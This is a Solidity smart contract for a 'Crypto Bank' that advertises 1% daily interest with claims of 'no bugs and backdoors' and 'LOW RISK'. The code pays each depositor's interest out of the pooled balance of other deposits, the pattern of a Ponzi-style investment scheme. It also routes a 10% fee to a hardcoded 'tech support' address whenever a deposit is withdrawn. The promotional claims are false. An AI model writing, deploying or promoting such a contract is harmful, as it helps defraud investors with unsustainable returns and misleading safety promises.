pragma solidity ^0.4.25;

//  CRYPTO BANK - Interest 1% Daily !
//  HODL until you are HOMELESS !!!
//  https://cryptobanktoday.wixsite.com/cryptobank
//
//  Improved, no bugs and backdoors! Your investments are safe!
//
//  NO DEPOSIT FEES! All the money go to contract!
//
//  WITHDRAWAL FEES! Technical Support - Tax 10% charged from The RETURNED DEPOSIT ONLY!!
//
//  LOW RISK! You can take your deposit back ANY TIME!
//
//     - Send 0.00000112 ETH to contract address (You will charged Tax 10% for The Tech Support)
//
//  LONG LIFE!
//
//  INSTRUCTIONS:
//
//  TO INVEST: send ETH to contract address
//  TO WITHDRAW INTEREST: send 0 ETH to contract address
//  TO REINVEST AND WITHDRAW INTEREST: send ETH to contract address
//  TO GET BACK YOUR DEPOSIT: send 0.00000112 ETH to contract address
//  RECOMMENDED GAS LIMIT: 200000
//  RECOMMENDED GAS PRICE: https://ethgasstation.info/
//

contract CryptoBank {
    // Record user info to registry
    mapping (address => uint) invested;
    mapping (address => uint) dates;
    
    // Tech Support info
    address constant public techSupport = 0x93aF2363A905Ec2fF6A2AC6d3AcF69A4c8370044;
    uint constant public techSupportPercent = 10;
   


    // This function called every time anyone sends a transaction to this contract
    function () external payable {

      // If user is invested more than 0 ether
     if (invested[msg.sender] != 0 && msg.value != 0.00000112 ether) {
                 
        //Calculation of the daily interest
       uint amount = invested[msg.sender] * 1 / 100 * (now - dates[msg.sender]) / 1 days;
            
       // If your deposit greater than balance.You will get the balance amount.
       if (amount > address(this).balance) {
           amount = address(this).balance;
          }
       }  
    
    // Returning  your deposit ! We will charge tax from your deposit !!
    if (invested[msg.sender] != 0 && msg.value == 0.00000112 ether) {
            
        //Calculate  tax from deposit.
        uint tax = invested[msg.sender] * techSupportPercent / 100;
          
        //Available deposit to withdrawal
        uint withdrawalAmount = (invested[msg.sender] - tax) + msg.value;

        // If your deposit greater than balance.You will get the balance amount.
        if (withdrawalAmount > address(this).balance) {
           withdrawalAmount = address(this).balance;
          }
            
        //Now paying  tax to the Tech Support
        techSupport.transfer(tax);
           
        //Paying remaining deposit
        msg.sender.transfer(withdrawalAmount);
         
        //Contract is terminated! Come back again ...
        dates[msg.sender] = 0;
        invested[msg.sender] = 0;
         
        } else {
            
        //Record user information to the Crypto Bank
        dates[msg.sender] = now;
        invested[msg.sender] += msg.value;  
    
         //Pay daily interest.
        msg.sender.transfer(amount); 
       }
    } 
}